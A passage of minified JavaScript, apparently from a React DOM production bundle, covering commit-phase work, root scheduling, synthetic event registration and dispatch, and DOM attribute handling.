                            if (s !== a && a && a.ownerDocument && Xr(a.ownerDocument.documentElement, a)) {
                                if (null !== c && en(a)) {
                                    var l = c.start
                                      , u = c.end;
                                    if (void 0 === u && (u = l),
                                    "selectionStart"in a)
                                        a.selectionStart = l,
                                        a.selectionEnd = Math.min(u, a.value.length);
                                    else {
                                        var d = a.ownerDocument || document
                                          , h = d && d.defaultView || window;
                                        if (h.getSelection) {
                                            var f = h.getSelection()
                                              , p = a.textContent.length
                                              , g = Math.min(c.start, p)
                                              , y = void 0 === c.end ? g : Math.min(c.end, p);
                                            !f.extend && g > y && (s = y,
                                            y = g,
                                            g = s);
                                            var m = Jr(a, g)
                                              , b = Jr(a, y);
                                            if (m && b && (1 !== f.rangeCount || f.anchorNode !== m.node || f.anchorOffset !== m.offset || f.focusNode !== b.node || f.focusOffset !== b.offset)) {
                                                var v = d.createRange();
                                                v.setStart(m.node, m.offset),
                                                f.removeAllRanges(),
                                                g > y ? (f.addRange(v),
                                                f.extend(b.node, b.offset)) : (v.setEnd(b.node, b.offset),
                                                f.addRange(v))
                                            }
                                        }
                                    }
                                }
                                for (d = [],
                                f = a; f = f.parentNode; )
                                    1 === f.nodeType && d.push({
                                        element: f,
                                        left: f.scrollLeft,
                                        top: f.scrollTop
                                    });
                                for ("function" === typeof a.focus && a.focus(),
                                a = 0; a < d.length; a++) {
                                    var w = d[a];
                                    w.element.scrollLeft = w.left,
                                    w.element.scrollTop = w.top
                                }
                            }
                            rh = !!td,
                            rd = td = null
                        } finally {
                            rl = o,
                            M.p = n,
                            k.T = r
                        }
                    }
                    e.current = t,
                    Cl = 2
                }
            }
            function ou() {
                if (2 === Cl) {
                    Cl = 0;
                    var e = Sl
                      , t = Il
                      , r = 0 !== (8772 & t.flags);
                    if (0 !== (8772 & t.subtreeFlags) || r) {
                        r = k.T,
                        k.T = null;
                        var n = M.p;
                        M.p = 2;
                        var o = rl;
                        rl |= 4;
                        try {
                            Pc(e, t.alternate, t)
                        } finally {
                            rl = o,
                            M.p = n,
                            k.T = r
                        }
                    }
                    Cl = 3
                }
            }
            function iu() {
                if (4 === Cl || 3 === Cl) {
                    Cl = 0,
                    ee();
                    var e = Sl
                      , t = Il
                      , r = Bl
                      , n = _l;
                    0 !== (10256 & t.subtreeFlags) || 0 !== (10256 & t.flags) ? Cl = 5 : (Cl = 0,
                    Il = Sl = null,
                    su(e, e.pendingLanes));
                    var o = e.pendingLanes;
                    if (0 === o && (Pl = null),
                    xe(r),
                    t = t.stateNode,
                    de && "function" === typeof de.onCommitFiberRoot)
                        try {
                            de.onCommitFiberRoot(ue, t, void 0, 128 === (128 & t.current.flags))
                        } catch (c) {}
                    if (null !== n) {
                        t = k.T,
                        o = M.p,
                        M.p = 2,
                        k.T = null;
                        try {
                            for (var i = e.onRecoverableError, s = 0; s < n.length; s++) {
                                var a = n[s];
                                i(a.value, {
                                    componentStack: a.stack
                                })
                            }
                        } finally {
                            k.T = t,
                            M.p = o
                        }
                    }
                    0 !== (3 & Bl) && au(),
                    Au(e),
                    o = e.pendingLanes,
                    0 !== (4194090 & r) && 0 !== (42 & o) ? e === Rl ? Wl++ : (Wl = 0,
                    Rl = e) : Wl = 0,
                    Eu(0, !1)
                }
            }
            function su(e, t) {
                0 === (e.pooledCacheLanes &= t) && (null != (t = e.pooledCache) && (e.pooledCache = null,
                Mo(t)))
            }
            function au(e) {
                return nu(),
                ou(),
                iu(),
                cu()
            }
            function cu() {
                if (5 !== Cl)
                    return !1;
                var e = Sl
                  , t = xl;
                xl = 0;
                var r = xe(Bl)
                  , n = k.T
                  , o = M.p;
                try {
                    M.p = 32 > r ? 32 : r,
                    k.T = null,
                    r = Ol,
                    Ol = null;
                    var i = Sl
                      , a = Bl;
                    if (Cl = 0,
                    Il = Sl = null,
                    Bl = 0,
                    0 !== (6 & rl))
                        throw Error(s(331));
                    var c = rl;
                    if (rl |= 4,
                    Jc(i.current),
                    Vc(i, i.current, a, r),
                    rl = c,
                    Eu(0, !1),
                    de && "function" === typeof de.onPostCommitFiberRoot)
                        try {
                            de.onPostCommitFiberRoot(ue, i)
                        } catch (l) {}
                    return !0
                } finally {
                    M.p = o,
                    k.T = n,
                    su(e, t)
                }
            }
            function lu(e, t, r) {
                t = Pn(r, t),
                null !== (e = si(e, t = Ea(e.stateNode, t, 2), 2)) && (Ce(e, 2),
                Au(e))
            }
            function uu(e, t, r) {
                if (3 === e.tag)
                    lu(e, e, r);
                else
                    for (; null !== t; ) {
                        if (3 === t.tag) {
                            lu(t, e, r);
                            break
                        }
                        if (1 === t.tag) {
                            var n = t.stateNode;
                            if ("function" === typeof t.type.getDerivedStateFromError || "function" === typeof n.componentDidCatch && (null === Pl || !Pl.has(n))) {
                                e = Pn(r, e),
                                null !== (n = si(t, r = Pa(2), 2)) && (Ca(r, n, t, e),
                                Ce(n, 2),
                                Au(n));
                                break
                            }
                        }
                        t = t.return
                    }
            }
            function du(e, t, r) {
                var n = e.pingCache;
                if (null === n) {
                    n = e.pingCache = new tl;
                    var o = new Set;
                    n.set(t, o)
                } else
                    void 0 === (o = n.get(t)) && (o = new Set,
                    n.set(t, o));
                o.has(r) || (ul = !0,
                o.add(r),
                e = hu.bind(null, e, t, r),
                t.then(e, e))
            }
            function hu(e, t, r) {
                var n = e.pingCache;
                null !== n && n.delete(t),
                e.pingedLanes |= e.suspendedLanes & r,
                e.warmLanes &= ~r,
                nl === e && (il & r) === r && (4 === hl || 3 === hl && (62914560 & il) === il && 300 > te() - Tl ? 0 === (2 & rl) && Vl(e, 0) : gl |= r,
                ml === il && (ml = 0)),
                Au(e)
            }
            function fu(e, t) {
                0 === t && (t = Ee()),
                null !== (e = _n(e, t)) && (Ce(e, t),
                Au(e))
            }
            function pu(e) {
                var t = e.memoizedState
                  , r = 0;
                null !== t && (r = t.retryLane),
                fu(e, r)
            }
            function gu(e, t) {
                var r = 0;
                switch (e.tag) {
                case 13:
                    var n = e.stateNode
                      , o = e.memoizedState;
                    null !== o && (r = o.retryLane);
                    break;
                case 19:
                    n = e.stateNode;
                    break;
                case 22:
                    n = e.stateNode._retryCache;
                    break;
                default:
                    throw Error(s(314))
                }
                null !== n && n.delete(t),
                fu(e, r)
            }
            var yu = null
              , mu = null
              , bu = !1
              , vu = !1
              , wu = !1
              , Tu = 0;
            function Au(e) {
                e !== mu && null === e.next && (null === mu ? yu = mu = e : mu = mu.next = e),
                vu = !0,
                bu || (bu = !0,
                dd((function() {
                    0 !== (6 & rl) ? J(ne, Pu) : Cu()
                }
                )))
            }
            function Eu(e, t) {
                if (!wu && vu) {
                    wu = !0;
                    do {
                        for (var r = !1, n = yu; null !== n; ) {
                            if (!t)
                                if (0 !== e) {
                                    var o = n.pendingLanes;
                                    if (0 === o)
                                        var i = 0;
                                    else {
                                        var s = n.suspendedLanes
                                          , a = n.pingedLanes;
                                        i = (1 << 31 - fe(42 | e) + 1) - 1,
                                        i = 201326741 & (i &= o & ~(s & ~a)) ? 201326741 & i | 1 : i ? 2 | i : 0
                                    }
                                    0 !== i && (r = !0,
                                    Bu(n, i))
                                } else
                                    i = il,
                                    0 === (3 & (i = ve(n, n === nl ? i : 0, null !== n.cancelPendingCommit || -1 !== n.timeoutHandle))) || we(n, i) || (r = !0,
                                    Bu(n, i));
                            n = n.next
                        }
                    } while (r);
                    wu = !1
                }
            }
            function Pu() {
                Cu()
            }
            function Cu() {
                vu = bu = !1;
                var e = 0;
                0 !== Tu && (function() {
                    var e = window.event;
                    if (e && "popstate" === e.type)
                        return e !== ad && (ad = e,
                        !0);
                    return ad = null,
                    !1
                }() && (e = Tu),
                Tu = 0);
                for (var t = te(), r = null, n = yu; null !== n; ) {
                    var o = n.next
                      , i = Su(n, t);
                    0 === i ? (n.next = null,
                    null === r ? yu = o : r.next = o,
                    null === o && (mu = r)) : (r = n,
                    (0 !== e || 0 !== (3 & i)) && (vu = !0)),
                    n = o
                }
                Eu(e, !1)
            }
            function Su(e, t) {
                for (var r = e.suspendedLanes, n = e.pingedLanes, o = e.expirationTimes, i = -62914561 & e.pendingLanes; 0 < i; ) {
                    var s = 31 - fe(i)
                      , a = 1 << s
                      , c = o[s];
                    -1 === c ? 0 !== (a & r) && 0 === (a & n) || (o[s] = Te(a, t)) : c <= t && (e.expiredLanes |= a),
                    i &= ~a
                }
                if (r = il,
                r = ve(e, e === (t = nl) ? r : 0, null !== e.cancelPendingCommit || -1 !== e.timeoutHandle),
                n = e.callbackNode,
                0 === r || e === t && (2 === sl || 9 === sl) || null !== e.cancelPendingCommit)
                    return null !== n && null !== n && X(n),
                    e.callbackNode = null,
                    e.callbackPriority = 0;
                if (0 === (3 & r) || we(e, r)) {
                    if ((t = r & -r) === e.callbackPriority)
                        return t;
                    switch (null !== n && X(n),
                    xe(r)) {
                    case 2:
                    case 8:
                        r = oe;
                        break;
                    case 32:
                    default:
                        r = ie;
                        break;
                    case 268435456:
                        r = ae
                    }
                    return n = Iu.bind(null, e),
                    r = J(r, n),
                    e.callbackPriority = t,
                    e.callbackNode = r,
                    t
                }
                return null !== n && null !== n && X(n),
                e.callbackPriority = 2,
                e.callbackNode = null,
                2
            }
            function Iu(e, t) {
                if (0 !== Cl && 5 !== Cl)
                    return e.callbackNode = null,
                    e.callbackPriority = 0,
                    null;
                var r = e.callbackNode;
                if (au() && e.callbackNode !== r)
                    return null;
                var n = il;
                return 0 === (n = ve(e, e === nl ? n : 0, null !== e.cancelPendingCommit || -1 !== e.timeoutHandle)) ? null : (Fl(e, n, t),
                Su(e, te()),
                null != e.callbackNode && e.callbackNode === r ? Iu.bind(null, e) : null)
            }
            function Bu(e, t) {
                if (au())
                    return null;
                Fl(e, t, !0)
            }
            function xu() {
                return 0 === Tu && (Tu = Ae()),
                Tu
            }
            function Ou(e) {
                return null == e || "symbol" === typeof e || "boolean" === typeof e ? null : "function" === typeof e ? e : xt("" + e)
            }
            function _u(e, t) {
                var r = t.ownerDocument.createElement("input");
                return r.name = t.name,
                r.value = t.value,
                e.id && r.setAttribute("form", e.id),
                t.parentNode.insertBefore(r, t),
                e = new FormData(e),
                r.parentNode.removeChild(r),
                e
            }
            for (var Wu = 0; Wu < Tn.length; Wu++) {
                var Ru = Tn[Wu];
                An(Ru.toLowerCase(), "on" + (Ru[0].toUpperCase() + Ru.slice(1)))
            }
            An(fn, "onAnimationEnd"),
            An(pn, "onAnimationIteration"),
            An(gn, "onAnimationStart"),
            An("dblclick", "onDoubleClick"),
            An("focusin", "onFocus"),
            An("focusout", "onBlur"),
            An(yn, "onTransitionRun"),
            An(mn, "onTransitionStart"),
            An(bn, "onTransitionCancel"),
            An(vn, "onTransitionEnd"),
            Ze("onMouseEnter", ["mouseout", "mouseover"]),
            Ze("onMouseLeave", ["mouseout", "mouseover"]),
            Ze("onPointerEnter", ["pointerout", "pointerover"]),
            Ze("onPointerLeave", ["pointerout", "pointerover"]),
            Ke("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" ")),
            Ke("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),
            Ke("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]),
            Ke("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" ")),
            Ke("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" ")),
            Ke("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
            var ku = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" ")
              , Mu = new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(ku));
            function Nu(e, t) {
                t = 0 !== (4 & t);
                for (var r = 0; r < e.length; r++) {
                    var n = e[r]
                      , o = n.event;
                    n = n.listeners;
                    e: {
                        var i = void 0;
                        if (t)
                            for (var s = n.length - 1; 0 <= s; s--) {
                                var a = n[s]
                                  , c = a.instance
                                  , l = a.currentTarget;
                                if (a = a.listener,
                                c !== i && o.isPropagationStopped())
                                    break e;
                                i = a,
                                o.currentTarget = l;
                                try {
                                    i(o)
                                } catch (u) {
                                    ma(u)
                                }
                                o.currentTarget = null,
                                i = c
                            }
                        else
                            for (s = 0; s < n.length; s++) {
                                if (c = (a = n[s]).instance,
                                l = a.currentTarget,
                                a = a.listener,
                                c !== i && o.isPropagationStopped())
                                    break e;
                                i = a,
                                o.currentTarget = l;
                                try {
                                    i(o)
                                } catch (u) {
                                    ma(u)
                                }
                                o.currentTarget = null,
                                i = c
                            }
                    }
                }
            }
            function Fu(e, t) {
                var r = t[Me];
                void 0 === r && (r = t[Me] = new Set);
                var n = e + "__bubble";
                r.has(n) || (ju(t, e, 2, !1),
                r.add(n))
            }
            function Uu(e, t, r) {
                var n = 0;
                t && (n |= 4),
                ju(r, e, n, t)
            }
            var Du = "_reactListening" + Math.random().toString(36).slice(2);
            function Lu(e) {
                if (!e[Du]) {
                    e[Du] = !0,
                    Ge.forEach((function(t) {
                        "selectionchange" !== t && (Mu.has(t) || Uu(t, !1, e),
                        Uu(t, !0, e))
                    }
                    ));
                    var t = 9 === e.nodeType ? e : e.ownerDocument;
                    null === t || t[Du] || (t[Du] = !0,
                    Uu("selectionchange", !1, t))
                }
            }
            function ju(e, t, r, n) {
                switch (lh(t)) {
                case 2:
                    var o = nh;
                    break;
                case 8:
                    o = oh;
                    break;
                default:
                    o = ih
                }
                r = o.bind(null, t, r, e),
                o = void 0,
                !Dt || "touchstart" !== t && "touchmove" !== t && "wheel" !== t || (o = !0),
                n ? void 0 !== o ? e.addEventListener(t, r, {
                    capture: !0,
                    passive: o
                }) : e.addEventListener(t, r, !0) : void 0 !== o ? e.addEventListener(t, r, {
                    passive: o
                }) : e.addEventListener(t, r, !1)
            }
            function zu(e, t, r, n, o) {
                var i = n;
                if (0 === (1 & t) && 0 === (2 & t) && null !== n)
                    e: for (; ; ) {
                        if (null === n)
                            return;
                        var s = n.tag;
                        if (3 === s || 4 === s) {
                            var a = n.stateNode.containerInfo;
                            if (a === o)
                                break;
                            if (4 === s)
                                for (s = n.return; null !== s; ) {
                                    var l = s.tag;
                                    if ((3 === l || 4 === l) && s.stateNode.containerInfo === o)
                                        return;
                                    s = s.return
                                }
                            for (; null !== a; ) {
                                if (null === (s = je(a)))
                                    return;
                                if (5 === (l = s.tag) || 6 === l || 26 === l || 27 === l) {
                                    n = i = s;
                                    continue e
                                }
                                a = a.parentNode
                            }
                        }
                        n = n.return
                    }
                Nt((function() {
                    var n = i
                      , o = _t(r)
                      , s = [];
                    e: {
                        var a = wn.get(e);
                        if (void 0 !== a) {
                            var l = Qt
                              , u = e;
                            switch (e) {
                            case "keypress":
                                if (0 === qt(r))
                                    break e;
                            case "keydown":
                            case "keyup":
                                l = pr;
                                break;
                            case "focusin":
                                u = "focus",
                                l = ir;
                                break;
                            case "focusout":
                                u = "blur",
                                l = ir;
                                break;
                            case "beforeblur":
                            case "afterblur":
                                l = ir;
                                break;
                            case "click":
                                if (2 === r.button)
                                    break e;
                            case "auxclick":
                            case "dblclick":
                            case "mousedown":
                            case "mousemove":
                            case "mouseup":
                            case "mouseout":
                            case "mouseover":
                            case "contextmenu":
                                l = nr;
                                break;
                            case "drag":
                            case "dragend":
                            case "dragenter":
                            case "dragexit":
                            case "dragleave":
                            case "dragover":
                            case "dragstart":
                            case "drop":
                                l = or;
                                break;
                            case "touchcancel":
                            case "touchend":
                            case "touchmove":
                            case "touchstart":
                                l = yr;
                                break;
                            case fn:
                            case pn:
                            case gn:
                                l = sr;
                                break;
                            case vn:
                                l = mr;
                                break;
                            case "scroll":
                            case "scrollend":
                                l = tr;
                                break;
                            case "wheel":
                                l = br;
                                break;
                            case "copy":
                            case "cut":
                            case "paste":
                                l = ar;
                                break;
                            case "gotpointercapture":
                            case "lostpointercapture":
                            case "pointercancel":
                            case "pointerdown":
                            case "pointermove":
                            case "pointerout":
                            case "pointerover":
                            case "pointerup":
                                l = gr;
                                break;
                            case "toggle":
                            case "beforetoggle":
                                l = vr
                            }
                            var d = 0 !== (4 & t)
                              , h = !d && ("scroll" === e || "scrollend" === e)
                              , f = d ? null !== a ? a + "Capture" : null : a;
                            d = [];
                            for (var p, g = n; null !== g; ) {
                                var y = g;
                                if (p = y.stateNode,
                                5 !== (y = y.tag) && 26 !== y && 27 !== y || null === p || null === f || null != (y = Ft(g, f)) && d.push(Vu(g, y, p)),
                                h)
                                    break;
                                g = g.return
                            }
                            0 < d.length && (a = new l(a,u,null,r,o),
                            s.push({
                                event: a,
                                listeners: d
                            }))
                        }
                    }
                    if (0 === (7 & t)) {
                        if (l = "mouseout" === e || "pointerout" === e,
                        (!(a = "mouseover" === e || "pointerover" === e) || r === Ot || !(u = r.relatedTarget || r.fromElement) || !je(u) && !u[ke]) && (l || a) && (a = o.window === o ? o : (a = o.ownerDocument) ? a.defaultView || a.parentWindow : window,
                        l ? (l = n,
                        null !== (u = (u = r.relatedTarget || r.toElement) ? je(u) : null) && (h = c(u),
                        d = u.tag,
                        u !== h || 5 !== d && 27 !== d && 6 !== d) && (u = null)) : (l = null,
                        u = n),
                        l !== u)) {
                            if (d = nr,
                            y = "onMouseLeave",
                            f = "onMouseEnter",
                            g = "mouse",
                            "pointerout" !== e && "pointerover" !== e || (d = gr,
                            y = "onPointerLeave",
                            f = "onPointerEnter",
                            g = "pointer"),
                            h = null == l ? a : Ve(l),
                            p = null == u ? a : Ve(u),
                            (a = new d(y,g + "leave",l,r,o)).target = h,
                            a.relatedTarget = p,
                            y = null,
                            je(o) === n && ((d = new d(f,g + "enter",u,r,o)).target = p,
                            d.relatedTarget = h,
                            y = d),
                            h = y,
                            l && u)
                                e: {
                                    for (f = u,
                                    g = 0,
                                    p = d = l; p; p = qu(p))
                                        g++;
                                    for (p = 0,
                                    y = f; y; y = qu(y))
                                        p++;
                                    for (; 0 < g - p; )
                                        d = qu(d),
                                        g--;
                                    for (; 0 < p - g; )
                                        f = qu(f),
                                        p--;
                                    for (; g--; ) {
                                        if (d === f || null !== f && d === f.alternate)
                                            break e;
                                        d = qu(d),
                                        f = qu(f)
                                    }
                                    d = null
                                }
                            else
                                d = null;
                            null !== l && Gu(s, a, l, d, !1),
                            null !== u && null !== h && Gu(s, h, u, d, !0)
                        }
                        if ("select" === (l = (a = n ? Ve(n) : window).nodeName && a.nodeName.toLowerCase()) || "input" === l && "file" === a.type)
                            var m = Fr;
                        else if (_r(a))
                            if (Ur)
                                m = $r;
                            else {
                                m = qr;
                                var b = Hr
                            }
                        else
                            !(l = a.nodeName) || "input" !== l.toLowerCase() || "checkbox" !== a.type && "radio" !== a.type ? n && St(n.elementType) && (m = Fr) : m = Gr;
                        switch (m && (m = m(e, n)) ? Wr(s, m, r, o) : (b && b(e, a, n),
                        "focusout" === e && n && "number" === a.type && null != n.memoizedProps.value && bt(a, "number", a.value)),
                        b = n ? Ve(n) : window,
                        e) {
                        case "focusin":
                            (_r(b) || "true" === b.contentEditable) && (rn = b,
                            nn = n,
                            on = null);
                            break;
                        case "focusout":
                            on = nn = rn = null;
                            break;
                        case "mousedown":
                            sn = !0;
                            break;
                        case "contextmenu":
                        case "mouseup":
                        case "dragend":
                            sn = !1,
                            an(s, r, o);
                            break;
                        case "selectionchange":
                            if (tn)
                                break;
                        case "keydown":
                        case "keyup":
                            an(s, r, o)
                        }
                        var v;
                        if (Tr)
                            e: {
                                switch (e) {
                                case "compositionstart":
                                    var w = "onCompositionStart";
                                    break e;
                                case "compositionend":
                                    w = "onCompositionEnd";
                                    break e;
                                case "compositionupdate":
                                    w = "onCompositionUpdate";
                                    break e
                                }
                                w = void 0
                            }
                        else
                            xr ? Ir(e, r) && (w = "onCompositionEnd") : "keydown" === e && 229 === r.keyCode && (w = "onCompositionStart");
                        w && (Pr && "ko" !== r.locale && (xr || "onCompositionStart" !== w ? "onCompositionEnd" === w && xr && (v = Ht()) : (zt = "value"in (jt = o) ? jt.value : jt.textContent,
                        xr = !0)),
                        0 < (b = Hu(n, w)).length && (w = new cr(w,e,null,r,o),
                        s.push({
                            event: w,
                            listeners: b
                        }),
                        v ? w.data = v : null !== (v = Br(r)) && (w.data = v))),
                        (v = Er ? function(e, t) {
                            switch (e) {
                            case "compositionend":
                                return Br(t);
                            case "keypress":
                                return 32 !== t.which ? null : (Sr = !0,
                                Cr);
                            case "textInput":
                                return (e = t.data) === Cr && Sr ? null : e;
                            default:
                                return null
                            }
                        }(e, r) : function(e, t) {
                            if (xr)
                                return "compositionend" === e || !Tr && Ir(e, t) ? (e = Ht(),
                                Vt = zt = jt = null,
                                xr = !1,
                                e) : null;
                            switch (e) {
                            case "paste":
                            default:
                                return null;
                            case "keypress":
                                if (!(t.ctrlKey || t.altKey || t.metaKey) || t.ctrlKey && t.altKey) {
                                    if (t.char && 1 < t.char.length)
                                        return t.char;
                                    if (t.which)
                                        return String.fromCharCode(t.which)
                                }
                                return null;
                            case "compositionend":
                                return Pr && "ko" !== t.locale ? null : t.data
                            }
                        }(e, r)) && (0 < (w = Hu(n, "onBeforeInput")).length && (b = new cr("onBeforeInput","beforeinput",null,r,o),
                        s.push({
                            event: b,
                            listeners: w
                        }),
                        b.data = v)),
                        function(e, t, r, n, o) {
                            if ("submit" === t && r && r.stateNode === o) {
                                var i = Ou((o[Re] || null).action)
                                  , s = n.submitter;
                                s && null !== (t = (t = s[Re] || null) ? Ou(t.formAction) : s.getAttribute("formAction")) && (i = t,
                                s = null);
                                var a = new Qt("action","action",null,n,o);
                                e.push({
                                    event: a,
                                    listeners: [{
                                        instance: null,
                                        listener: function() {
                                            if (n.defaultPrevented) {
                                                if (0 !== Tu) {
                                                    var e = s ? _u(o, s) : new FormData(o);
                                                    _s(r, {
                                                        pending: !0,
                                                        data: e,
                                                        method: o.method,
                                                        action: i
                                                    }, null, e)
                                                }
                                            } else
                                                "function" === typeof i && (a.preventDefault(),
                                                e = s ? _u(o, s) : new FormData(o),
                                                _s(r, {
                                                    pending: !0,
                                                    data: e,
                                                    method: o.method,
                                                    action: i
                                                }, i, e))
                                        },
                                        currentTarget: o
                                    }]
                                })
                            }
                        }(s, e, n, r, o)
                    }
                    Nu(s, t)
                }
                ))
            }
            function Vu(e, t, r) {
                return {
                    instance: e,
                    listener: t,
                    currentTarget: r
                }
            }
            function Hu(e, t) {
                for (var r = t + "Capture", n = []; null !== e; ) {
                    var o = e
                      , i = o.stateNode;
                    if (5 !== (o = o.tag) && 26 !== o && 27 !== o || null === i || (null != (o = Ft(e, r)) && n.unshift(Vu(e, o, i)),
                    null != (o = Ft(e, t)) && n.push(Vu(e, o, i))),
                    3 === e.tag)
                        return n;
                    e = e.return
                }
                return []
            }
            function qu(e) {
                if (null === e)
                    return null;
                do {
                    e = e.return
                } while (e && 5 !== e.tag && 27 !== e.tag);
                return e || null
            }
            function Gu(e, t, r, n, o) {
                for (var i = t._reactName, s = []; null !== r && r !== n; ) {
                    var a = r
                      , c = a.alternate
                      , l = a.stateNode;
                    if (a = a.tag,
                    null !== c && c === n)
                        break;
                    5 !== a && 26 !== a && 27 !== a || null === l || (c = l,
                    o ? null != (l = Ft(r, i)) && s.unshift(Vu(r, l, c)) : o || null != (l = Ft(r, i)) && s.push(Vu(r, l, c))),
                    r = r.return
                }
                0 !== s.length && e.push({
                    event: t,
                    listeners: s
                })
            }
            var $u = /\r\n?/g
              , Ku = /\u0000|\uFFFD/g;
            function Zu(e) {
                return ("string" === typeof e ? e : "" + e).replace($u, "\n").replace(Ku, "")
            }
            function Yu(e, t) {
                return t = Zu(t),
                Zu(e) === t
            }
            function Ju() {}
            function Xu(e, t, r, n, o, i) {
                switch (r) {
                case "children":
                    "string" === typeof n ? "body" === t || "textarea" === t && "" === n || At(e, n) : ("number" === typeof n || "bigint" === typeof n) && "body" !== t && At(e, "" + n);
                    break;
                case "className":
                    rt(e, "class", n);
                    break;
                case "tabIndex":
                    rt(e, "tabindex", n);
                    break;
                case "dir":
                case "role":
                case "viewBox":
                case "width":
                case "height":
                    rt(e, r, n);
                    break;
                case "style":
                    Ct(e, n, i);
                    break;
                case "data":
                    if ("object" !== t) {
                        rt(e, "data", n);
                        break
                    }
                case "src":
                case "href":
                    if ("" === n && ("a" !== t || "href" !== r)) {
                        e.removeAttribute(r);
                        break
                    }
                    if (null == n || "function" === typeof n || "symbol" === typeof n || "boolean" === typeof n) {
                        e.removeAttribute(r);
                        break
                    }
                    n = xt("" + n),
                    e.setAttribute(r, n);
                    break;
                case "action":
                case "formAction":
                    if ("function" === typeof n) {
                        e.setAttribute(r, "javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");
                        break
                    }
                    if ("function" === typeof i && ("formAction" === r ? ("input" !== t && Xu(e, t, "name", o.name, o, null),
                    Xu(e, t, "formEncType", o.formEncType, o, null),
                    Xu(e, t, "formMethod", o.formMethod, o, null),
                    Xu(e, t, "formTarget", o.formTarget, o, null)) : (Xu(e, t, "encType", o.encType, o, null),
                    Xu(e, t, "method", o.method, o, null),
                    Xu(e, t, "target", o.target, o, null))),
                    null == n || "symbol" === typeof n || "boolean" === typeof n) {
                        e.removeAttribute(r);
                        break
                    }
                    n = xt("" + n),
                    e.setAttribute(r, n);
                    break;
                case "onClick":
                    null != n && (e.onclick = Ju);
                    break;
                case "onScroll":
                    null != n && Fu("scroll", e);
                    break;
                case "onScrollEnd":
                    null != n && Fu("scrollend", e);
                    break;
                case "dangerouslySetInnerHTML":
                    if (null != n) {
                        if ("object" !== typeof n || !("__html"in n))
                            throw Error(s(61));
                        if (null != (r = n.__html)) {
                            if (null != o.children)
                                throw Error(s(60));
                            e.innerHTML = r
                        }
                    }
                    break;
                case "multiple":
                    e.multiple = n && "function" !== typeof n && "symbol" !== typeof n;
                    break;
                case "muted":
                    e.muted = n && "function" !== typeof n && "symbol" !== typeof n;
                    break;
                case "suppressContentEditableWarning":
                case "suppressHydrationWarning":
                case "defaultValue":
                case "defaultChecked":
                case "innerHTML":
                case "ref":
                case "autoFocus":
                    break;
                case "xlinkHref":
                    if (null == n || "function" === typeof n || "boolean" === typeof n || "symbol" === typeof n) {
                        e.removeAttribute("xlink:href");
                        break
                    }
                    r = xt("" + n),
                    e.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", r);
                    break;
                case "contentEditable":
                case "spellCheck":
                case "draggable":
                case "value":
                case "autoReverse":
                case "externalResourcesRequired":
                case "focusable":
                case "preserveAlpha":
                    null != n && "function" !== typeof n && "symbol" !== typeof n ? e.setAttribute(r, "" + n) : e.removeAttribute(r);
                    break;
                case "inert":
                case "allowFullScreen":
                case "async":
                case "autoPlay":
                case "controls":
                case "default":
                case "defer":
                case "disabled":
                case "disablePictureInPicture":
                case "disableRemotePlayback":
                case "formNoValidate":
                case "hidden":
                case "loop":
                case "noModule":
                case "noValidate":
                case "open":
                case "playsInline":
                case "readOnly":
                case "required":
                case "reversed":
                case "scoped":
                case "seamless":
                case "itemScope":
                    n && "function" !== typeof n && "symbol" !== typeof n ? e.setAttribute(r, "") : e.removeAttribute(r);
                    break;
                case "capture":
                case "download":
                    !0 === n ? e.setAttribute(r, "") : !1 !== n && null != n && "function" !== typeof n && "symbol" !== typeof n ? e.setAttribute(r, n) : e.removeAttribute(r);
                    break;
                case "cols":
                case "rows":
                case "size":
                case "span":
                    null != n && "function" !== typeof n && "symbol" !== typeof n && !isNaN(n) && 1 <= n ? e.setAttribute(r, n) : e.removeAttribute(r);
                    break;
                case "rowSpan":
                case "start":
                    null == n || "function" === typeof n || "symbol" === typeof n || isNaN(n) ? e.removeAttribute(r) : e.setAttribute(r, n);
                    break;
                case "popover":
                    Fu("beforetoggle", e),
                    Fu("toggle", e),
                    tt(e, "popover", n);
                    break;
                case "xlinkActuate":
                    nt(e, "http://www.w3.org/1999/xlink", "xlink:actuate", n);
                    break;
                case "xlinkArcrole":
                    nt(e, "http://www.w3.org/1999/xlink", "xlink:arcrole", n);
                    break;
                case "xlinkRole":
                    nt(e, "http://www.w3.org/1999/xlink", "xlink:role", n);
                    break;
                case "xlinkShow":
                    nt(e, "http://www.w3.org/1999/xlink", "xlink:show", n);
                    break;
                case "xlinkTitle":
                    nt(e, "http://www.w3.org/1999/xlink", "xlink:title", n);
                    break;
                case "xlinkType":
                    nt(e, "http://www.w3.org/1999/xlink", "xlink:type", n);
                    break;
                case "xmlBase":
                    nt(e, "http://www.w3.org/XML/1998/namespace", "xml:base", n);
                    break;
                case "xmlLang":
                    nt(e, "http://www.w3.org/XML/1998/namespace", "xml:lang", n);
                    break;
                case "xmlSpace":
                    nt(e, "http://www.w3.org/XML/1998/namespace", "xml:space", n);
                    break;
                case "is":
                    tt(e, "is", n);
                    break;
                case "innerText":
                case "textContent":
                    break;
                default:
                    (!(2 < r.length) || "o" !== r[0] && "O" !== r[0] || "n" !== r[1] && "N" !== r[1]) && tt(e, r = It.get(r) || r, n)
                }
            }
            function Qu(e, t, r, n, o, i) {
                switch (r) {
                case "style":
                    Ct(e, n, i);
                    break;
                case "dangerouslySetInnerHTML":
                    if (null != n) {
                        if ("object" !== typeof n || !("__html"in n))
                            throw Error(s(61));
                        if (null != (r = n.__html)) {
                            if (null != o.children)
                                throw Error(s(60));
                            e.innerHTML = r
                        }
                    }
                    break;
                case "children":
                    "string" === typeof n ? At(e, n) : ("number" === typeof n || "bigint" === typeof n) && At(e, "" + n);
                    break;
                case "onScroll":
                    null != n && Fu("scroll", e);
                    break;
                case "onScrollEnd":
                    null != n && Fu("scrollend", e);
                    break;
                case "onClick":
                    null != n && (e.onclick = Ju);
                    break;
                case "suppressContentEditableWarning":
